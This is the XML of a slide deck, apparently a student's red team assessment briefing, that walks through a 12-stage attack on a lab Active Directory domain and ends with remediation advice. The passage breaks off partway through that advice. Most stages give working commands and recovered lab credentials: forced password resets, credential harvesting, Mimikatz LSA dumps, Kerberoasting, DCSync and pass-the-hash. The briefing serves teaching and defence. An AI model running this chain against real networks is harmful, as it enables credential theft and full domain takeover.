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Calibri"/>
              </a:rPr>
              <a:t>CY376: NETWORK MONITORING, SECURITY AND AUDITING</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr sz="3600" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Simulated Privilege Escalation &amp;
Domain Compromise Briefing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94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>An Assumed-Breach Red Team Assessment of INLANEFREIGHT.LOCAL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206240"/>
            <a:ext cx="103628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8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Presenter: Enoch Nana Tabi Oduro  |  Index: CY376-2026-REG  |  Track: Red Team Assessment
Target Domain: INLANEFREIGHT.LOCAL  |  Assessment Framework: Assumed-Breach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1. Engagement Scope &amp; Assumed-Breach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Assumed-Breach Threat Model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Realistic Adversary Scenario: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Simulates an insider threat or compromised low-privilege employee workstation.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Initial Access Vector: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Pre-authenticated foothold established as user 'hporter' (Domain User).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Scope Boundaries: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Active Directory domain controllers, member servers, and network share infrastructure.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Zero Prior Privileges: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>No administrative rights or privileged group memberships provided upfront.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Validates security posture against real-world post-exploitation adversary TTPs.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422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74520"/>
            <a:ext cx="47850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Primary Technical Objectives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Privilege Escalation Validation: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Demonstrate end-to-end lateral movement and privilege escalation to Domain Admin.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Misconfiguration Mapping: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Identify excessive ACL delegations, stored credentials, and unsecure services.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DCSync Replication: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Exfiltrate directory credentials via NTDS replication rights.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Remediation Roadmap: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Provide actionable, prioritized defense-in-depth guidance aligned with CIS Benchmarks.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Objective: 100% compromise of INLANEFREIGHT.LOCAL Active Directory forest.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2. Lab Target Environment &amp; Network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DC01 (172.16.8.3)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Role: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Primary Domain Controller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OS: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Windows Server 2019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Services: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Active Directory DS, Kerberos, LDAP, SMB, DNS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42255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74520"/>
            <a:ext cx="4785055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MS01 (172.16.8.50)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Role: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Internal Member Server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OS: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Windows Server 2019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Services: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>WinRM, Sysax Automation Service, SQL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69080"/>
            <a:ext cx="512064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DEV01 / DMZ01 (172.16.8.10)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Role: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Web Pivot / Internal Web Server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OS: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Ubuntu 22.04 LTS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Services: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>HTTP Apache, SSH, Internal Web Apps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069080"/>
            <a:ext cx="5242255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297680"/>
            <a:ext cx="4785055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Attacker Station (10.10.15.145)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Platform: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Kali Linux Red Team Workstation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Tooling Suite: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>NetExec, Impacket, bloodyAD, Mimikatz, BloodHound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Network Path: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Routable subnet to target lab 172.16.8.0/24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3. 12-Stage Attack Chain Overview &amp; Chained Vectors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102714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Chained Attack Progression (hporter -&gt; Domain Admin)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Foothold &amp; Recon (Stages 1-2): </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Validate hporter credentials; BloodHound ACL query identifies ForceChangePassword over ssmalls.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ACL Reset &amp; Share Harvesting (Stages 3-4): </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>bloodyAD resets ssmalls password; NetExec share spider finds backupadm credentials in backup script.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Lateral Movement &amp; LSA Dump (Stages 5-8): </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Evil-WinRM onto MS01 as backupadm; exploit Sysax service for SYSTEM; Mimikatz dumps mssqladm secrets.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Kerberoasting &amp; Group Addition (Stages 9-10): </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>GenericWrite over ttimmons -&gt; SPN injection &amp; Hashcat crack (Repeat09); GenericAll self-addition to Server Admins.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DCSync &amp; Domain Takeover (Stages 11-12): </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>DCSync replication dumps Administrator NTLM hash; Pass-the-Hash Evil-WinRM shell on DC01.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12 distinct technical stages successfully chained together to achieve total domain takeover.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01]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1: Initial Access &amp; Foothold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1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Verify initial assumed-breach credentials for user hporter.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Target Host: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>DC01 (172.16.8.3) over SMB.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Tool Employed: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>NetExec (nxc smb 172.16.8.3 -u hporter -p 'Gr8hambino!')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Execution Syntax: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>nxc smb 172.16.8.3 -u hporter -p 'Gr8hambino!'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Outcome: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Returned SMB [+] status, confirming valid domain authentication.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Foothold established under INLANEFREIGHT\hporter identity.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362502"/>
            <a:ext cx="5242255" cy="4530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532120"/>
            <a:ext cx="52422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1: NetExec SMB Credential Verification for hporter against DC01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02]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2: Active Directory Enumeration (BloodHound)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2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Enumerate Active Directory ACLs and locate escalation paths from hporter.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Tool Employed: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>BloodHound / SharpHound ingestor &amp; Cypher query engine.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Cypher Query: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>MATCH p=(u:User {name:'HPORTER@INLANEFREIGHT.LOCAL'})-[r]-&gt;(t) RETURN p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Discovered Abusable Right: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ForceChangePassword ACL over user ssmalls.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Significance: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Allows resetting target user password without knowing existing credentials.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Path identified: hporter possesses ForceChangePassword authority over ssmalls.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639635"/>
            <a:ext cx="5242255" cy="18987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532120"/>
            <a:ext cx="52422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2: BloodHound ACL Analysis Revealing ForceChangePassword Right over ssmalls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03]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3: Abuse of ForceChangePassword ACL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3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Force reset ssmalls' password over LDAP using bloodyAD.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Tool Employed: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>bloodyAD &amp; NetExec SMB verification.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Command Syntax: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>bloodyAD -u hporter -p 'Gr8hambino!' -d inlanefreight.local --host 172.16.8.3 set password ssmalls 'mazoniakid'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Verification Syntax: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>nxc smb 172.16.8.3 -u ssmalls -p 'mazoniakid'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Outcome: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>LDAP password reset successful; SMB login validated under ssmalls identity.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Identity takeover complete: Control of ssmalls account secured.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792973"/>
            <a:ext cx="5242255" cy="15920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532120"/>
            <a:ext cx="52422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3: Password Reset Execution over ssmalls via bloodyAD and NetExec SMB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04]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4: File Share Credential Harvesting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4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Harvest plaintext credentials from network file shares accessible to ssmalls.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Share Enumeration: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>NetExec SMB spidering against DC01 ('Department Shares').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Artifact Discovered: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>'SQL Express Backup.ps1' backup script in IT directory.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Credentials Extracted: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>backupadm : !qazXSW@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Risk Factors: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Hardcoded service account credentials stored in unencrypted scripts.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Recovered cleartext credentials for backupadm service account.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9320" y="1783080"/>
            <a:ext cx="5333695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381" y="1965960"/>
            <a:ext cx="2445571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3154680"/>
            <a:ext cx="49679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4a: SMB Share Spidering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3931920"/>
            <a:ext cx="5333695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154823"/>
            <a:ext cx="4967935" cy="925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5303520"/>
            <a:ext cx="49679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4b: Extraction of Plaintext Credentials from Backup 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05]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5: WinRM Host Discovery &amp; Lateral Movement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5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Pivot laterally onto member server MS01 using harvested credentials.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Service Discovery: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>WinRM (TCP 5985) listening on MS01 (172.16.8.50).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Tool Employed: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Evil-WinRM remote shell client.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Execution Syntax: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>evil-winrm -i 172.16.8.50 -u backupadm -p '!qazXSW@'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Outcome: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Established interactive Remote PowerShell session on MS01 as backupadm.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Lateral movement successful: Interactive shell obtained on MS01.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588574"/>
            <a:ext cx="5242255" cy="2000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532120"/>
            <a:ext cx="52422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5: Evil-WinRM Remote Interactive Shell Established on MS01 as backupadm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06]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6: Leftover Deployment Artifact Exposure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6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Inspect MS01 file system for leftover OS installation/deployment artifacts.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Artifact Located: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>C:\panther\unattend.xml (Unattended Windows Setup configuration).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Tool Employed: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Evil-WinRM file system inspection (Get-Content C:\panther\unattend.xml).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Credentials Recovered: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ilfserveradm : Sys26Admin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Impact: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Unencrypted deployment file contained sensitive administrative credentials.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Discovered cleartext credentials for ilfserveradm in Panther setup log.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23295"/>
            <a:ext cx="5242255" cy="2331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532120"/>
            <a:ext cx="52422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6: Discovery of Plaintext Credentials for ilfserveradm in C:\panther\unattend.xml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07]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7: Local Privilege Escalation on MS01 (Sysax Service)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7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Escalate privileges to NT AUTHORITY\SYSTEM on member server MS01.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Vulnerability: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Sysax Automation Service running as SYSTEM with web GUI on TCP 88.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Exploitation Method: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Configured Sysax custom event trigger to execute batch script.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Batch Script Action: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>net localgroup Administrators ilfserveradm /add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Outcome: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ilfserveradm successfully added to MS01 Local Administrators group.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Privilege escalation complete: Local Administrative control secured on MS01.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9320" y="1783080"/>
            <a:ext cx="5333695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129" y="1965960"/>
            <a:ext cx="1834075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3154680"/>
            <a:ext cx="49679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7: Sysax Automation Service Web Interface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3931920"/>
            <a:ext cx="5333695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984" y="4114800"/>
            <a:ext cx="3458366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5303520"/>
            <a:ext cx="49679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8: Execution of Custom Batch Script Adding ilfserveradm to Local Admins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08]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8: LSA Secrets Dump on MS01 (Autologon Secrets)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8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Dump Local Security Authority (LSA) registry secrets from MS01 memory.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Prerequisite: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Local Administrator / SYSTEM privileges on MS01.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Tool Employed: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Mimikatz lsadump::secrets &amp; Winlogon registry query.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Target Account: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>mssqladm (SQL Server Administrator).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Credentials Recovered: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>mssqladm : DBAilfreight1!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LSA memory dump yielded cleartext password for mssqladm.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514409"/>
            <a:ext cx="5242255" cy="21492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532120"/>
            <a:ext cx="52422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9: Registry Winlogon DefaultUserName Query &amp; Mimikatz LSA Dump for mssqladm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09]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9: Targeted Kerberoasting via GenericWrite Delegation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9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Compromise target user ttimmons via Targeted Kerberoasting.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Delegation Right: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>mssqladm possessed GenericWrite control over ttimmons object.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SPN Injection: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>bloodyAD set SPN 'mssql/MS01' on ttimmons account.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Ticket Request: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Impacket GetUserSPNs.py requested Kerberos TGS ticket.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Offline Cracking: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Hashcat (Mode 13100) cracked TGS hash -&gt; 'Repeat09'.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Targeted Kerberoasting successfully compromised ttimmons : Repeat09.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9320" y="1783080"/>
            <a:ext cx="5333695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783" y="1965960"/>
            <a:ext cx="2588768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3154680"/>
            <a:ext cx="49679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11: Targeted SPN Injection on ttimmons via bloodyAD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3931920"/>
            <a:ext cx="5333695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856" y="4114800"/>
            <a:ext cx="3444622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5303520"/>
            <a:ext cx="496793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12: Hashcat Offline TGS Ticket Cracking (Repeat09)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10]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10: Privileged Group Self-Addition (Server Admins)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10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Elevate ttimmons to a high-privilege domain security group.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Abusable ACL: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ttimmons possessed GenericAll control over 'Server Admins' group.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Tool Employed: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>bloodyAD group membership addition.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Execution Syntax: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>bloodyAD -u ttimmons -p 'Repeat09' -d inlanefreight.local --host 172.16.8.3 add groupMember 'Server Admins' ttimmons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Inherited Rights: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Server Admins group possesses Directory Replication (DCSync) rights.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Self-addition complete: ttimmons joined Server Admins group.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601348"/>
            <a:ext cx="5242255" cy="19753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532120"/>
            <a:ext cx="52422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13: Group Membership Query Confirming ttimmons Addition to Server Admins Group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11]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11: DCSync Attack - Full Domain Credential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11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Extract all Active Directory user NTLM hashes via Directory Replication.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Attack Technique: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>DCSync attack utilizing DS-Replication-Get-Changes-All extended right.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Tool Employed: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Impacket secretsdump.py.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Execution Syntax: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>python3 secretsdump.py inlanefreight.local/ttimmons:'Repeat09'@172.16.8.3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Exfiltrated Hashes: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Administrator NTLM hash: 161cff084477ae097a9f726700ad71a4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Full NTDS database dump achieved: All domain hashes exfiltrated.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082076"/>
            <a:ext cx="5242255" cy="10138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532120"/>
            <a:ext cx="52422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14: Impacket secretsdump.py Performing DCSync Replication Dumping NTLM Hashes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[STAGE 12]  </a:t>
            </a:r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Stage 12: Proof of Domain Compromise (Pass-the-Hash)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480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Stage 12 Details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Objective: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Prove 100% full domain compromise by gaining interactive shell on DC01.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Attack Technique: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Pass-the-Hash (PtH) authentication over WinRM.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Tool Employed: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Evil-WinRM remote shell client.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Execution Syntax: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>evil-winrm -i 172.16.8.3 -u Administrator -H 161cff084477ae097a9f726700ad71a4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Final Identity: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>INLANEFREIGHT\Administrator (SYSTEM privilege on Domain Controller DC01).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100% Domain Compromise Proven: Full interactive Domain Admin shell on DC01.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645920"/>
            <a:ext cx="560801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615226"/>
            <a:ext cx="5242255" cy="19475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532120"/>
            <a:ext cx="52422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Figure 15: BloodHound Full Attack Path Visualizing Chained Escalation to DCSync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6. Root-Cause Misconfigurations &amp; Chained Risk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102714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Chained Vulnerability Impact Summary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Excessive ACL Delegations: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ForceChangePassword, GenericWrite, and GenericAll assigned to standard users enabled unauthorized password resets and SPN injection.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Cleartext Credential Exposure: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Hardcoded service passwords in SMB share scripts ('SQL Express Backup.ps1') and unencrypted unattend.xml setup files.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Unsecure Third-Party Services: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Sysax Automation Service running under SYSTEM context allowed local privilege escalation via Web GUI batch triggers.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Over-Privileged Group ACLs: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Server Admins group possessed Directory Replication (DCSync) rights, allowing non-Domain Admin accounts to dump NTDS database.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A single low-privilege breach was amplified into full domain takeover due to cumulative misconfigurations.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7. Prioritized Defensive Remediation Roadmap (CIS Benchmarks)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102714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Defensive Action Plan &amp; CIS Alignment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1. Revoke Directory Replication Rights (CRITICAL): </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Immediately strip GetChanges and GetChangesAll rights from non-DC accounts including Server Admins.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2. Remediate Excessive ACL Delegations (HIGH): </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Audit AD ACLs using BloodHound Enterprise; purge ForceChangePassword &amp; GenericWrite on user objects.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3. Migrate Service Accounts to gMSAs (HIGH): </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
